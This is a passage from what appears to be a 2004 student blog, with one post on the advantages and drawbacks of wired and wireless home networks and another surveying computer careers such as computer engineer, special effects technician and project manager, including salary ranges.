+       Today we did some research on different types of networks and their uses. Basically there are two main categories; wired, meaning that your computers are connected by some wire, or wireless, where the computer comunicates without any wires, just sends message to the box, and to the other computer.    Advantages of Networks  Believe it ot not, buying network components are getting cheaper and cheaper because more and more people are starting to use them. Wireless networking is becoming more and more popular each day, because of it's unique organization. You can send files via your computer much faster and easier than storing it on floppy or Cd and then openin it on the other computer. You can also play game together in the same house, or even room! Many games have the network feature so it becomes very handy indeed.   Disadvanteges of Networks  Having a network could impose a serious threat to security issues. When you're not connected to any kinds of networks, you could not get hacked, unless you already have a trojan/virus/worm present inside your computer. If you have a large network, it takes one computer to gain access to all other computers, so say that there is a big company. Someone gains access to a worker's computer because of security holes and exploits(computer is not up-to-date updated).The hacker then will scan the  computer's current connections reveiling all the information that could be hoped for, on  all  the other computers, because they are one, big network. Transfering big files on wireless networks is also a hassle.  
+     
+
+    
+</post>
+
+<date>01,May,2004</date>
+<post>
+
+	 
+       Let’s face it everybody, the future and the present depends entirely on computers. No wonder there is so many jobs today that require at least some of the knowledge of computer industry. Everyone is high school should be able to properly use computers because they don’t know for sure where they will end up in the future, so computers are your best friends in the beginning and end. Even if your job is something like a security guard, when you write in your resume “able to work, fix and operate computer based technologies” it would be very beneficial. Here are some jobs that require computer knowledge:   Computer Engineer   The name explains it all; computer engineer is someone who is responsible for the computer hardware, like microprocessor, memory, motherboard, graphics card, etc. It is a very difficult job in which you need a lot of computer engineering experience and learning. You could think of people who created the Pentium chip, they had to make sure the computer worked on it, and that the software would also be able to work on it, since most of the software requires certain Pentium chip to run.  Computer engineers have to recognize both hardware and software in order to accomplish a good computer. Common types of engineers develop operating systems like Macintosh, Windows and Linux. They could also create software such as word processing, and database (Microsoft Word and Access).   If you are interested in doing something like computer engineering, then consider taking these courses in college or university; computer engineering, software engineering, electrical engineering, computer engineering technology, as well as computer science. It would help if you were logical and creative person, who can solve problems. You have to be familiar with business industry, because there is usually some sort of competition. Say there is two computer projects underway, and they are very much similar. The first to be out in the market could get all the glory and money, while the other could end up bankrupt. This is type of pressure on the computer engineer in a company.  The pay is excellent; starting graduated engineers could begin earning $40,000 to $50,000 a year. After a couple of years of experience, you could be making between $50,000 to $70,000. Those who make it far in promotion, and can handle themselves of managing sections in computer company, will probably get about $75,000 to $150,000.    Special Effects Technician   This person’s job is to make the special effects that you see today in almost every movie. Special effects technicians make effects that will bring the audience great entertainment. Movies like “The Matrix”, “The Lord of the Rings”, and “Troy” depend highly on these special effects to make the movie seem real. Special effects are just illusions, created my computerized applications. Believe it or not, special effects could make the change in s successful film, or a breakdown, because the audience experiences deep impact among their emotions and fears if the effects are done professionally.  There are many unique areas for special effects technicians, in which computer animation is the most popular. Makeup is also considered as one of them. Basically, makeup is when you want to make something look real even though it’s fake like a scar, black eye, or a broken leg. Mechanical effects specialists work with backgrounds and sets, as seen in most nature and war movies. There are also pyrotechnics technicians, who are solely responsible for creating explosions, flames and gun combat.  Most of the special effects technicians earn from $30,000 to 60,000 a year. Some earn much more because they are in greater movie business like Hollywood and Los Angeles. The summer is the busiest, because that is when the shooting is, so they need to prepare months before it.    Think you’re up for the job? Computer graphics and programming is your best choice for computer animations, but generally visual art, video production and design is also great to get into. High school courses that you might look into are computers, physics, woodwork and electronics. Getting a part time with the department is not a bad idea, and it would really improve your image if you have a lot of creativity, imagination and artistic talent.    Project Manager   I kinda like this job because it gives you the feeling that you’re in control of the whole situation. Project Manager’s main job is to coordinate the work of team of computer employees so that the project that they’re working on is up-to-date. You are the boss of everybody in a way, you tell them how much you want done, calculate the cost of project and basically you are the guy responsible for the whole operation. For those who saw the movie “Anti-Trust”, Gary (bad guy) is sort of the project manager, because he inspires people to do their job and does everything that the project is done perfectly and on time.  This job sound amazing, what’s the catch you might ask? Project Manager is not an easy job to get into; typically you would start off as a programmer (who writes source codes for programs), or an analyst (who designs programs). To get into those two jobs you need a university degree. When you actually get promoted to project manager for your outstanding performance, you would start projecting single projects and earning between $50,000 to $75,000 a year. Believe me that’s more than you think.  If you are thinking about getting into this job, here are some college or university programs that they are looking for: Project Management, Computer Science, Computer Engineering, and Computer Programming. You pretty much have to be a good leader, have influence on people, cooperate well with others, etc. The working conditions are quite normal; labor is from 45-60 hours a week.   Sources:   urlLink http://www.careercruising.com 
+     
+
+    
+</post>
+
+
+</Blog>
